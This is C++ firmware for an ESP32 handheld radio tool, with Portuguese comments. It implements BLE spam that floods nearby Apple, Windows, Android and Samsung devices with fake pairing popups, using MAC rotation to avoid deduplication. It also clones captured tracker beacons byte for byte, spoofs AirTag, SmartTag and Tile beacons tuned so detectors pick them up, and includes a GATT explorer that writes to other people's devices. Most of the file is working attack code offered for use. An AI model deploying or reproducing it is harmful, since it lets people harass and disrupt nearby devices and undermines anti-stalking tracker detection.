#include "scrbtm.h"

// ====================================================================
//  BLUETOOTH — tudo de BLE num lugar so:
//    1) BLE Spam        (Apple / Windows / Android / All)
//    2) Presence Tags   (Scan + Clone de trackers, e Spoof AirTag/Samsung/Tile)
//
//  API NimBLE 1.x. Em 2.x a classe de callback de scan muda
//  (NimBLEScanCallbacks) e ble_hs_id_set_rnd/getNative podem diferir.
// ====================================================================

#define BLE_SPAM_DELAY 40

static int bleCounter = 1;
static NimBLEAdvertising *pAdvertising;

// Tipos de spam suportados (um por ecossistema)
enum BleSpamType { BLE_APPLE, BLE_MICROSOFT, BLE_GOOGLE, BLE_SAMSUNG, BLE_TYPE_COUNT };

// Remove a ISR do RCSwitch na GPIO 4 antes de ligar o radio BT. O init do BT
// desliga o cache da flash; uma ISR em flash disparando ali = crash.
static void bleDetachRfIsr() {
  mySwitch.disableReceive();
  detachInterrupt(digitalPinToInterrupt(RX_PIN));
}

// Gera e aplica um endereco BLE aleatorio (static random) a cada anuncio.
// Sem isso, Android/Windows agrupam os anuncios pelo MAC e param de exibir
// os popups depois de poucos segundos.
void setRandomBleMac() {
  uint8_t mac[6];
  esp_fill_random(mac, 6);
  mac[5] |= 0xC0; // 2 bits mais significativos = 11 -> static random address
  ble_hs_id_set_rnd(mac);
}

// ==================== SETUP BLE (spam) ====================
void Blesetup() {
  Serial.println(F("Init BLE..."));
  showMessage("Init BLE...");

  bleDetachRfIsr();
  NimBLEDevice::init("");

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);

  NimBLEServer *pServer = NimBLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  // Anuncia usando endereco aleatorio (necessario para a rotacao de MAC).
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

  srand(esp_random()); // semente para variar os pacotes a cada sessao

  Serial.println(F("BLE OK!"));
}

// ==================== APPLE (iOS) — Proximity Pairing ====================
NimBLEAdvertisementData getAppleAdv() {
  NimBLEAdvertisementData data = NimBLEAdvertisementData();
  uint8_t packet[17];
  uint8_t i = 0;

  packet[i++] = 16;    // Tamanho da estrutura AD
  packet[i++] = 0xFF;  // Tipo: Manufacturer Specific
  packet[i++] = 0x4C;  // Company ID (Apple, Inc.) - LSB
  packet[i++] = 0x00;  // Company ID - MSB
  packet[i++] = 0x0F;  // Tipo
  packet[i++] = 0x05;  // Tamanho
  packet[i++] = 0xC1;  // Action Flags

  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type

  esp_fill_random(&packet[i], 3); // Authentication Tag
  i += 3;

  packet[i++] = 0x00;
  packet[i++] = 0x00;
  packet[i++] = 0x10;  // Type

  esp_fill_random(&packet[i], 3);

  data.addData(std::string((char *)packet, 17));
  return data;
}

// ==================== MICROSOFT (Windows) — Swift Pair ====================
NimBLEAdvertisementData getMicrosoftAdv() {
  NimBLEAdvertisementData data = NimBLEAdvertisementData();

  const char *names[] = { "Mouse", "Keyboard", "Headset", "Speaker", "ScaryRF" };
  const char *name = names[rand() % (sizeof(names) / sizeof(names[0]))];
  uint8_t nameLen = strlen(name);

  uint8_t packet[31];
  uint8_t i = 0;

  packet[i++] = 6 + nameLen; // Tamanho da estrutura AD (tipo + payload)
  packet[i++] = 0xFF;        // Manufacturer Specific
  packet[i++] = 0x06;        // Microsoft Company ID - LSB (0x0006)
  packet[i++] = 0x00;        // Microsoft Company ID - MSB
  packet[i++] = 0x03;        // Microsoft Beacon ID
  packet[i++] = 0x00;        // Beacon Sub Scenario (Pairing over LE)
  packet[i++] = 0x80;        // Reserved RSSI byte
  memcpy(&packet[i], name, nameLen);
  i += nameLen;

  data.addData(std::string((char *)packet, i));
  return data;
}

// ==================== GOOGLE (Android) — Fast Pair ====================
NimBLEAdvertisementData getGoogleAdv() {
  NimBLEAdvertisementData data = NimBLEAdvertisementData();

  // Model IDs conhecidos que disparam o popup de "dispositivo proximo"
  const uint32_t models[] = {
    0xCD8256, 0x0000F0, 0x821F66, 0x92BBBD,
    0x05A963, 0x000047, 0x801009, 0x00000A
  };
  uint32_t model = models[rand() % (sizeof(models) / sizeof(models[0]))];

  uint8_t packet[11];
  uint8_t i = 0;

  // Lista completa de UUIDs de servico 16-bit: 0xFE2C (Fast Pair)
  packet[i++] = 0x03;
  packet[i++] = 0x03;
  packet[i++] = 0x2C;
  packet[i++] = 0xFE;
  // Service Data do Fast Pair com o Model ID (3 bytes, big-endian)
  packet[i++] = 0x06;
  packet[i++] = 0x16;
  packet[i++] = 0x2C;
  packet[i++] = 0xFE;
  packet[i++] = (model >> 16) & 0xFF;
  packet[i++] = (model >> 8) & 0xFF;
  packet[i++] = model & 0xFF;

  data.addData(std::string((char *)packet, i));
  return data;
}

// ==================== SAMSUNG — EasySetup (Galaxy Buds/Watch popup) ====================
// Manufacturer data Samsung (0x0075) com o "magic" do EasySetup + um Model ID
// que define qual acessorio aparece no popup. O byte de tamanho do AD e calculado
// em runtime para nunca ficar inconsistente.
NimBLEAdvertisementData getSamsungAdv() {
  NimBLEAdvertisementData data = NimBLEAdvertisementData();

  // Model IDs de Galaxy Buds/Watch que disparam o popup "EasySetup".
  const uint16_t models[] = {
    0xEE7A, 0x9D14, 0x1F2C, 0x9101, 0x6F70, 0x0732, 0x0035, 0x3D8A
  };
  uint16_t model = models[rand() % (sizeof(models) / sizeof(models[0]))];

  uint8_t packet[31];
  uint8_t i = 0;

  // AD 1: Flags
  packet[i++] = 0x02; packet[i++] = 0x01; packet[i++] = 0x18;

  // AD 2: Manufacturer Specific (Samsung). O tamanho entra depois.
  uint8_t lenPos = i;
  packet[i++] = 0x00;        // placeholder do tamanho
  packet[i++] = 0xFF;        // Manufacturer Specific
  packet[i++] = 0x75; packet[i++] = 0x00; // Samsung Electronics (0x0075)

  // "Magic" do EasySetup (Buds/Watch advertising)
  const uint8_t body[] = { 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09 };
  memcpy(&packet[i], body, sizeof(body)); i += sizeof(body);

  packet[i++] = (model >> 8) & 0xFF; // Model ID (big-endian)
  packet[i++] = model & 0xFF;

  const uint8_t tail[] = { 0x06, 0x3C, 0x94, 0x8E, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x00 };
  memcpy(&packet[i], tail, sizeof(tail)); i += sizeof(tail);

  packet[lenPos] = i - lenPos - 1; // tamanho cobre tudo depois do byte de tamanho

  data.addData(std::string((char *)packet, i));
  return data;
}

// ==================== LOOP BLE SPAM ====================
void Bleloop() {
  static const CmdEntry bleCmds[] = { { CMD_LEFT, "Exit" } };
  const char *typeNames[] = { "Apple", "Microsoft", "Google", "Samsung" };
  const char *modeNames[] = { "Apple", "Windows", "Android", "Samsung", "BLE All" };

  bleCounter = 1;

  while (!btnLeft.isPressed()) {
    // Define qual pacote enviar conforme o modo escolhido no menu.
    int type;
    switch (bleSpamMode) {
      case BLE_MODE_APPLE:   type = BLE_APPLE;     break;
      case BLE_MODE_WINDOWS: type = BLE_MICROSOFT; break;
      case BLE_MODE_ANDROID: type = BLE_GOOGLE;    break;
      case BLE_MODE_SAMSUNG: type = BLE_SAMSUNG;   break;
      default:               type = rand() % BLE_TYPE_COUNT; break; // BLE_MODE_ALL
    }

    NimBLEAdvertisementData advData;
    switch (type) {
      case BLE_APPLE:     advData = getAppleAdv();     break;
      case BLE_MICROSOFT: advData = getMicrosoftAdv(); break;
      case BLE_GOOGLE:    advData = getGoogleAdv();    break;
      case BLE_SAMSUNG:   advData = getSamsungAdv();   break;
    }

    setRandomBleMac(); // novo MAC a cada anuncio (anti-deduplicacao)
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();

    // Feedback na tela
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.setCursor(0, 12);
    u8g2.print("BLE: ");
    u8g2.print(modeNames[bleSpamMode]);
    u8g2.setCursor(0, 26);
    u8g2.print("Pkt: ");
    u8g2.print(typeNames[type]);
    u8g2.setCursor(0, 40);
    u8g2.print("Sent: ");
    u8g2.print(bleCounter++);
    drawCommandBar(bleCmds, 1);
    u8g2.sendBuffer();

    delay(BLE_SPAM_DELAY);
  }

  NimBLEDevice::deinit();
}

// ====================================================================
//  PRESENCE TAGS — Scan / Clone / Spoof de trackers BLE
// ====================================================================

// ---- Buffers de resultado do scan (sem String para evitar fragmentacao) ----
#define PRESENCE_MAX 24
static char    presLabel[PRESENCE_MAX][16];
static char    presAddr[PRESENCE_MAX][18];
static int     presRssi[PRESENCE_MAX];
static uint8_t presPayload[PRESENCE_MAX][31]; // anuncio cru (para clonar)
static uint8_t presPayLen[PRESENCE_MAX];
static uint8_t presMac[PRESENCE_MAX][6];      // endereco nativo (LSB first)
static int     presCount = 0;

// Classifica um anuncio BLE como tipo de tracker conhecido, ou NULL se nao for.
static const char* classifyTracker(NimBLEAdvertisedDevice *dev) {
  if (dev->haveManufacturerData()) {
    std::string md = dev->getManufacturerData();
    if (md.length() >= 3) {
      uint16_t cid = (uint8_t)md[0] | ((uint8_t)md[1] << 8);
      uint8_t  t   = (uint8_t)md[2];
      if (cid == 0x004C) {            // Apple
        if (t == 0x12) return "AirTag/FindMy";
        if (t == 0x07) return "Apple nearby";
      }
      if (cid == 0x0075) return "Samsung Tag"; // Samsung Electronics
    }
  }
  if (dev->isAdvertisingService(NimBLEUUID((uint16_t)0xFEED))) return "Tile";
  if (dev->isAdvertisingService(NimBLEUUID((uint16_t)0xFD5A))) return "Samsung Tag";
  if (dev->isAdvertisingService(NimBLEUUID((uint16_t)0xFEAA))) return "Eddystone";
  return NULL;
}

// Adiciona/atualiza um tracker no buffer, deduplicando por endereco MAC.
static void addTracker(const char *label, NimBLEAdvertisedDevice *dev) {
  std::string addr = dev->getAddress().toString();
  int slot = -1;
  for (int i = 0; i < presCount; i++) {
    if (strncmp(presAddr[i], addr.c_str(), sizeof(presAddr[0]) - 1) == 0) { slot = i; break; }
  }
  if (slot < 0) {
    if (presCount >= PRESENCE_MAX) return;
    slot = presCount++;
    strncpy(presAddr[slot], addr.c_str(), sizeof(presAddr[0]) - 1);
    presAddr[slot][sizeof(presAddr[0]) - 1] = '\0';
    memcpy(presMac[slot], dev->getAddress().getNative(), 6);
  }
  strncpy(presLabel[slot], label, sizeof(presLabel[0]) - 1);
  presLabel[slot][sizeof(presLabel[0]) - 1] = '\0';
  presRssi[slot] = dev->getRSSI();

  // Guarda o anuncio cru completo (todas as estruturas AD) para clonar verbatim.
  uint8_t *pl = dev->getPayload();
  size_t   ln = dev->getPayloadLength();
  if (ln > sizeof(presPayload[0])) ln = sizeof(presPayload[0]);
  memcpy(presPayload[slot], pl, ln);
  presPayLen[slot] = ln;
}

class TrackerCallbacks : public NimBLEAdvertisedDeviceCallbacks {
  void onResult(NimBLEAdvertisedDevice *dev) {
    const char *kind = classifyTracker(dev);
    if (kind) addTracker(kind, dev);
  }
};

static void presenceBleInit() {
  bleDetachRfIsr();
  NimBLEDevice::init("");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
}

// Emite um anuncio cru (payload completo) com um MAC fixo. Usado pelo Clone:
// reproduz a tag capturada byte-a-byte ate o LEFT.
static void cloneLoop(const uint8_t *payload, uint8_t len, const uint8_t *mac, const char *label) {
  static const CmdEntry cloneCmds[] = { { CMD_LEFT, "Stop" } };

  NimBLEAdvertising *pAdv = NimBLEDevice::getAdvertising();
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

  while (btnOk.isHeld()) delay(10); // solta o OK que iniciou o clone

  unsigned long counter = 1;
  while (!btnLeft.isPressed()) {
    uint8_t m[6];
    memcpy(m, mac, 6);
    ble_hs_id_set_rnd(m); // mesmo endereco da tag original

    NimBLEAdvertisementData advData;
    advData.addData(std::string((const char *)payload, len));
    pAdv->setAdvertisementData(advData);
    pAdv->start();
    delay(20);
    pAdv->stop();

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.setCursor(0, 12); u8g2.print("Cloning tag:");
    u8g2.setCursor(0, 26); u8g2.print(label);
    u8g2.setCursor(0, 40); u8g2.print("Sent: "); u8g2.print(counter++);
    drawCommandBar(cloneCmds, 1);
    u8g2.sendBuffer();
    delay(40);
  }
}

// ==================== SCAN (com Clone) ====================
void PresenceScan() {
  static const CmdEntry scanCmds[] = {
    { CMD_OK, "Clone" }, { CMD_RIGHT, "Scan" }, { CMD_DOWN, "Nav" }, { CMD_LEFT, "Exit" }
  };

  presenceBleInit();
  TrackerCallbacks cb;
  NimBLEScan *pScan = NimBLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(&cb, false);
  pScan->setActiveScan(true);
  pScan->setInterval(100);
  pScan->setWindow(99);

  int top = 0, sel = 0;
  bool rescan = true;

  while (true) {
    if (rescan) {
      rescan = false;
      presCount = 0;
      showMessage("Presence", "Scanning trackers...");
      pScan->start(4, false); // 4s, bloqueante; callback preenche o buffer
      pScan->clearResults();
      sel = 0; top = 0;
    }

    // ---- Render ----
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.setCursor(0, 8);
    u8g2.printf("Trackers: %d", presCount);

    if (presCount == 0) {
      u8g2.setCursor(0, 24);
      u8g2.print("None nearby :)");
    } else {
      const int rows = 3;
      if (sel < top) top = sel;
      if (sel >= top + rows) top = sel - rows + 1;
      for (int r = 0; r < rows; r++) {
        int idx = top + r;
        if (idx >= presCount) break;
        int y = 18 + r * 10;
        u8g2.setCursor(0, y);  u8g2.print(idx == sel ? ">" : " ");
        u8g2.setCursor(8, y);  u8g2.print(presLabel[idx]);
        u8g2.setCursor(98, y); u8g2.printf("%d", presRssi[idx]);
      }
    }
    drawCommandBar(scanCmds, 4);
    u8g2.sendBuffer();

    // ---- Input ----
    if (btnLeft.isPressed()) break;
    if (btnRight.isPressed()) { rescan = true; continue; }
    if (presCount > 0) {
      if (btnDown.isPressed()) sel = (sel + 1) % presCount;
      if (btnUp.isPressed())   sel = (sel - 1 + presCount) % presCount;
      if (btnOk.isPressed()) {
        // Clona a tag selecionada (payload cru + MAC original) ate o LEFT.
        pScan->stop();
        cloneLoop(presPayload[sel], presPayLen[sel], presMac[sel], presLabel[sel]);
      }
    }
    delay(20);
  }

  pScan->clearResults();
  NimBLEDevice::deinit();
}

// ====================================================================
//  BLE SCANNER / ANALYZER — recon geral (todos os dispositivos BLE)
// ====================================================================
#define BLESCAN_MAX 32
static char    bscanName[BLESCAN_MAX][24];
static char    bscanAddr[BLESCAN_MAX][18];
static char    bscanInfo[BLESCAN_MAX][20]; // fabricante / 1o service UUID
static int     bscanRssi[BLESCAN_MAX];
static uint8_t bscanAddrType[BLESCAN_MAX];  // tipo do endereco (p/ conectar no GATT)
static int     bscanCount = 0;

// Adiciona/atualiza um dispositivo no buffer, deduplicando por MAC.
static void bscanAdd(NimBLEAdvertisedDevice *dev) {
  std::string addr = dev->getAddress().toString();
  int slot = -1;
  for (int i = 0; i < bscanCount; i++)
    if (strncmp(bscanAddr[i], addr.c_str(), sizeof(bscanAddr[0]) - 1) == 0) { slot = i; break; }
  if (slot < 0) {
    if (bscanCount >= BLESCAN_MAX) return;
    slot = bscanCount++;
    strncpy(bscanAddr[slot], addr.c_str(), sizeof(bscanAddr[0]) - 1);
    bscanAddr[slot][sizeof(bscanAddr[0]) - 1] = '\0';
    bscanAddrType[slot] = dev->getAddress().getType();
  }

  if (dev->haveName()) {
    strncpy(bscanName[slot], dev->getName().c_str(), sizeof(bscanName[0]) - 1);
    bscanName[slot][sizeof(bscanName[0]) - 1] = '\0';
  } else {
    strcpy(bscanName[slot], "(no name)");
  }
  bscanRssi[slot] = dev->getRSSI();

  // Info curta: company id do fabricante, ou o 1o service UUID, ou "-".
  if (dev->haveManufacturerData()) {
    std::string md = dev->getManufacturerData();
    if (md.length() >= 2) {
      uint16_t cid = (uint8_t)md[0] | ((uint8_t)md[1] << 8);
      snprintf(bscanInfo[slot], sizeof(bscanInfo[0]), "Mfr:%04X", cid);
    } else strcpy(bscanInfo[slot], "-");
  } else if (dev->haveServiceUUID()) {
    std::string u = dev->getServiceUUID().toString();
    snprintf(bscanInfo[slot], sizeof(bscanInfo[0]), "Svc:%.14s", u.c_str());
  } else {
    strcpy(bscanInfo[slot], "-");
  }
}

class BleScanCB : public NimBLEAdvertisedDeviceCallbacks {
  void onResult(NimBLEAdvertisedDevice *dev) { bscanAdd(dev); }
};

// ====================================================================
//  GATT EXPLORER — conecta num device e le/escreve caracteristicas
// ====================================================================
#define GATT_MAX 48
static NimBLERemoteCharacteristic *gattChars[GATT_MAX];
static int gattCharCount = 0;

// String curta de propriedades: R(ead) W(rite) N(otify).
static void gattPropsStr(NimBLERemoteCharacteristic *ch, char *out, size_t n) {
  char p[4]; int k = 0;
  if (ch->canRead())   p[k++] = 'R';
  if (ch->canWrite() || ch->canWriteNoResponse()) p[k++] = 'W';
  if (ch->canNotify()) p[k++] = 'N';
  p[k] = '\0';
  strncpy(out, k ? p : "-", n);
  out[n - 1] = '\0';
}

void gattExplore(const char *addrStr, uint8_t addrType, const char *name) {
  showMessage("GATT", "Connecting...", name);

  NimBLEClient *pClient = NimBLEDevice::createClient();
  // (usa o timeout de conexao padrao do NimBLE; unidade varia entre versoes)

  NimBLEAddress addr(std::string(addrStr), addrType);
  if (!pClient->connect(addr)) {
    showMessage("Connect failed");
    delay(1000);
    NimBLEDevice::deleteClient(pClient);
    return;
  }

  // Enumera todas as caracteristicas (achatando os servicos numa lista so).
  gattCharCount = 0;
  std::vector<NimBLERemoteService *> *svcs = pClient->getServices(true);
  if (svcs) {
    for (auto &svc : *svcs) {
      std::vector<NimBLERemoteCharacteristic *> *chs = svc->getCharacteristics(true);
      if (!chs) continue;
      for (auto &ch : *chs)
        if (gattCharCount < GATT_MAX) gattChars[gattCharCount++] = ch;
    }
  }

  if (gattCharCount == 0) {
    showMessage("No characteristics");
    delay(1000);
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return;
  }

  static const CmdEntry listCmds[] = {
    { CMD_OK, "Open" }, { CMD_DOWN, "Nav" }, { CMD_LEFT, "Back" }
  };
  static const CmdEntry chCmds[] = {
    { CMD_OK, "Write" }, { CMD_RIGHT, "Read" }, { CMD_UP, "Val" }, { CMD_LEFT, "Back" }
  };

  int top = 0, sel = 0;
  bool inChar = false;
  uint8_t wByte = 0x01;      // byte a escrever (ajustavel com UP/DOWN)
  uint8_t rbuf[16]; int rlen = 0; // ultimo valor lido

  while (pClient->isConnected()) {
    if (!inChar) {
      // ---- Lista de caracteristicas ----
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_6x10_tf);
      u8g2.setCursor(0, 8); u8g2.printf("Chars: %d", gattCharCount);

      const int rows = 3;
      if (sel < top) top = sel;
      if (sel >= top + rows) top = sel - rows + 1;
      for (int r = 0; r < rows; r++) {
        int idx = top + r;
        if (idx >= gattCharCount) break;
        int y = 18 + r * 10;
        char props[6]; gattPropsStr(gattChars[idx], props, sizeof(props));
        std::string uuid = gattChars[idx]->getUUID().toString();
        u8g2.setCursor(0, y);  u8g2.print(idx == sel ? ">" : " ");
        u8g2.setCursor(8, y);  u8g2.printf("%.13s", uuid.c_str());
        u8g2.setCursor(104, y); u8g2.print(props);
      }
      drawCommandBar(listCmds, 3);
      u8g2.sendBuffer();

      if (btnLeft.isPressed()) break;
      if (btnDown.isPressed()) sel = (sel + 1) % gattCharCount;
      if (btnUp.isPressed())   sel = (sel - 1 + gattCharCount) % gattCharCount;
      if (btnOk.isPressed()) {
        inChar = true;
        wByte = 0x01;
        rlen = 0;
        // Le uma vez ao abrir (se for legivel).
        if (gattChars[sel]->canRead()) {
          std::string v = gattChars[sel]->readValue();
          rlen = v.size() > sizeof(rbuf) ? sizeof(rbuf) : v.size();
          memcpy(rbuf, v.data(), rlen);
        }
      }
    } else {
      // ---- Detalhe/edicao de uma caracteristica ----
      NimBLERemoteCharacteristic *ch = gattChars[sel];
      std::string uuid = ch->getUUID().toString();

      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_6x10_tf);
      u8g2.setCursor(0, 8);  u8g2.printf("%.20s", uuid.c_str());

      // Valor lido em hex (ate 6 bytes) + ASCII
      u8g2.setCursor(0, 20); u8g2.print("Val:");
      for (int j = 0; j < rlen && j < 6; j++) u8g2.printf(" %02X", rbuf[j]);
      u8g2.setCursor(0, 30); u8g2.print("Asc: ");
      for (int j = 0; j < rlen && j < 12; j++)
        u8g2.print((rbuf[j] >= 32 && rbuf[j] < 127) ? (char)rbuf[j] : '.');

      // Editor do byte a escrever
      u8g2.setCursor(0, 42);
      if (ch->canWrite() || ch->canWriteNoResponse()) u8g2.printf("Write: 0x%02X", wByte);
      else u8g2.print("(read-only)");

      drawCommandBar(chCmds, 4);
      u8g2.sendBuffer();

      if (btnLeft.isPressed()) { inChar = false; }
      if (btnUp.isPressed())   wByte++;
      if (btnDown.isPressed()) wByte--;
      if (btnRight.isPressed() && ch->canRead()) {
        std::string v = ch->readValue();
        rlen = v.size() > sizeof(rbuf) ? sizeof(rbuf) : v.size();
        memcpy(rbuf, v.data(), rlen);
      }
      if (btnOk.isPressed() && (ch->canWrite() || ch->canWriteNoResponse())) {
        bool ok = ch->writeValue(&wByte, 1, ch->canWrite()); // response so se suportar
        showMessage(ok ? "Written" : "Write failed");
        delay(600);
      }
    }
    delay(20);
  }

  pClient->disconnect();
  NimBLEDevice::deleteClient(pClient);
}

void BleScanner() {
  static const CmdEntry listCmds[] = {
    { CMD_OK, "Info" }, { CMD_RIGHT, "Scan" }, { CMD_DOWN, "Nav" }, { CMD_LEFT, "Exit" }
  };
  static const CmdEntry detCmds[] = { { CMD_OK, "Conn" }, { CMD_LEFT, "Back" } };

  presenceBleInit();
  BleScanCB cb;
  NimBLEScan *pScan = NimBLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(&cb, false);
  pScan->setActiveScan(true);
  pScan->setInterval(100);
  pScan->setWindow(99);

  int top = 0, sel = 0;
  bool rescan = true, showDetail = false;

  while (true) {
    if (rescan) {
      rescan = false;
      bscanCount = 0;
      showMessage("BLE Scan", "Scanning...");
      pScan->start(5, false); // 5s, bloqueante; callback preenche o buffer
      pScan->clearResults();
      sel = 0; top = 0;
    }

    // ---- Tela de detalhe de um dispositivo ----
    if (showDetail && bscanCount > 0) {
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_6x10_tf);
      u8g2.setCursor(0, 10); u8g2.printf("%.20s", bscanName[sel]);
      u8g2.setCursor(0, 22); u8g2.print(bscanAddr[sel]);
      u8g2.setCursor(0, 34); u8g2.printf("RSSI: %d dBm", bscanRssi[sel]);
      u8g2.setCursor(0, 44); u8g2.printf("%.20s", bscanInfo[sel]);
      drawCommandBar(detCmds, 2);
      u8g2.sendBuffer();
      if (btnLeft.isPressed()) showDetail = false;
      if (btnOk.isPressed()) {
        // Conecta e explora o GATT do device selecionado (le/escreve chars).
        // Para o scan antes de conectar; ao voltar, re-escaneia.
        pScan->stop();
        gattExplore(bscanAddr[sel], bscanAddrType[sel], bscanName[sel]);
        showDetail = false;
        rescan = true;
      }
      delay(20);
      continue;
    }

    // ---- Lista ----
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.setCursor(0, 8); u8g2.printf("BLE devs: %d", bscanCount);
    if (bscanCount == 0) {
      u8g2.setCursor(0, 24); u8g2.print("None found");
    } else {
      const int rows = 3;
      if (sel < top) top = sel;
      if (sel >= top + rows) top = sel - rows + 1;
      for (int r = 0; r < rows; r++) {
        int idx = top + r;
        if (idx >= bscanCount) break;
        int y = 18 + r * 10;
        u8g2.setCursor(0, y);  u8g2.print(idx == sel ? ">" : " ");
        u8g2.setCursor(8, y);  u8g2.printf("%.13s", bscanName[idx]);
        u8g2.setCursor(98, y); u8g2.printf("%d", bscanRssi[idx]);
      }
    }
    drawCommandBar(listCmds, 4);
    u8g2.sendBuffer();

    if (btnLeft.isPressed()) break;
    if (btnRight.isPressed()) { rescan = true; continue; }
    if (bscanCount > 0) {
      if (btnDown.isPressed()) sel = (sel + 1) % bscanCount;
      if (btnUp.isPressed())   sel = (sel - 1 + bscanCount) % bscanCount;
      if (btnOk.isPressed())   showDetail = true;
    }
    delay(20);
  }

  pScan->clearResults();
  NimBLEDevice::deinit();
}

// ==================== PACOTES DE SPOOF ====================
// AirTag (FindMy / offline finding) — beacon estilo OpenHaystack.
// Detalhe que faltava: numa AirTag real o ENDERECO BLE sao os 6 primeiros bytes
// da chave publica, e o anuncio carrega os bytes 6..27 + os 2 bits altos do
// byte 0. Endereco e payload precisam vir da MESMA chave, senao o beacon fica
// inconsistente e detectores (AirGuard, Tracker Detect) o ignoram.

// Gera uma chave publica FindMy de 28 bytes.
static void makeAirtagKey(uint8_t *key) {
  esp_fill_random(key, 28);
  key[0] |= 0xC0; // 2 bits mais significativos = 11 (vira endereco static random)
}

// Endereco BLE = 6 primeiros bytes da chave. mac[5] e o byte mais significativo
// (mesma convencao do setRandomBleMac), entao invertemos a ordem.
static void setAirtagMac(const uint8_t *key) {
  uint8_t mac[6];
  for (int i = 0; i < 6; i++) mac[i] = key[5 - i];
  ble_hs_id_set_rnd(mac);
}

static NimBLEAdvertisementData airtagAdvFromKey(const uint8_t *key) {
  NimBLEAdvertisementData data;
  uint8_t p[31];
  uint8_t i = 0;
  p[i++] = 0x1E;                 // length (30)
  p[i++] = 0xFF;                 // manufacturer specific
  p[i++] = 0x4C; p[i++] = 0x00;  // Apple
  p[i++] = 0x12;                 // FindMy / offline finding
  p[i++] = 0x19;                 // length (25)
  p[i++] = 0x00;                 // status
  memcpy(&p[i], &key[6], 22); i += 22;   // chave publica bytes 6..27
  p[i++] = key[0] >> 6;          // 2 bits altos do byte 0 da chave
  p[i++] = 0x00;                 // hint
  data.addData(std::string((char *)p, i)); // i == 31
  return data;
}

// Samsung SmartTag (aproximado): service UUID 0xFD5A + manufacturer Samsung.
static NimBLEAdvertisementData getSmartTagAdv() {
  NimBLEAdvertisementData data;
  uint8_t p[31];
  uint8_t i = 0;
  p[i++] = 0x03; p[i++] = 0x03; p[i++] = 0x5A; p[i++] = 0xFD; // service UUID 0xFD5A
  p[i++] = 0x0A; p[i++] = 0xFF; p[i++] = 0x75; p[i++] = 0x00; // manufacturer Samsung 0x0075
  esp_fill_random(&p[i], 7); i += 7;
  data.addData(std::string((char *)p, i));
  return data;
}

// Tile (aproximado): service UUID 0xFEED + service data 0xFEED com ID aleatorio.
static NimBLEAdvertisementData getTileAdv() {
  NimBLEAdvertisementData data;
  uint8_t p[31];
  uint8_t i = 0;
  p[i++] = 0x03; p[i++] = 0x03; p[i++] = 0xED; p[i++] = 0xFE; // service UUID 0xFEED
  p[i++] = 0x10; p[i++] = 0x16; p[i++] = 0xED; p[i++] = 0xFE; // service data 0xFEED (len 16)
  esp_fill_random(&p[i], 13); i += 13;
  data.addData(std::string((char *)p, i));
  return data;
}

// ==================== SPOOF ====================
void PresenceSpoof() {
  static const CmdEntry spoofCmds[] = { { CMD_LEFT, "Stop" } };
  const char *names[] = { "AirTag", "Samsung Tag", "Tile" };

  presenceBleInit();
  NimBLEAdvertising *pAdv = NimBLEDevice::getAdvertising();
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  srand(esp_random());

  while (btnOk.isHeld()) delay(10); // solta o OK que abriu o modo

  uint8_t airKey[28];
  makeAirtagKey(airKey);
  unsigned long keyTime = millis();
  unsigned long counter = 1;

  while (!btnLeft.isPressed()) {
    // Modo ALL: alterna entre os 3 tipos a cada anuncio.
    int type = presenceSpoofType;
    if (type == PRESENCE_SPOOF_ALL) type = rand() % 3;

    NimBLEAdvertisementData advData;
    if (type == PRESENCE_SPOOF_AIRTAG) {
      // Roda a chave a cada 30s (AirTag real ~15min): estavel o suficiente p/ um
      // detector travar na "mesma" tag. Endereco vem da chave (nao aleatorio).
      if (millis() - keyTime > 30000) { makeAirtagKey(airKey); keyTime = millis(); }
      setAirtagMac(airKey);
      advData = airtagAdvFromKey(airKey);
    } else if (type == PRESENCE_SPOOF_SMARTTAG) {
      setRandomBleMac();
      advData = getSmartTagAdv();
    } else {
      setRandomBleMac();
      advData = getTileAdv();
    }

    pAdv->setAdvertisementData(advData);
    pAdv->start();
    delay(20);
    pAdv->stop();

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.setCursor(0, 12);
    u8g2.print(presenceSpoofType == PRESENCE_SPOOF_ALL ? "Spoof ALL:" : "Spoofing tag:");
    u8g2.setCursor(0, 26); u8g2.print(names[type]);
    u8g2.setCursor(0, 40); u8g2.print("Sent: "); u8g2.print(counter++);
    drawCommandBar(spoofCmds, 1);
    u8g2.sendBuffer();

    delay(40);
  }

  NimBLEDevice::deinit();
}
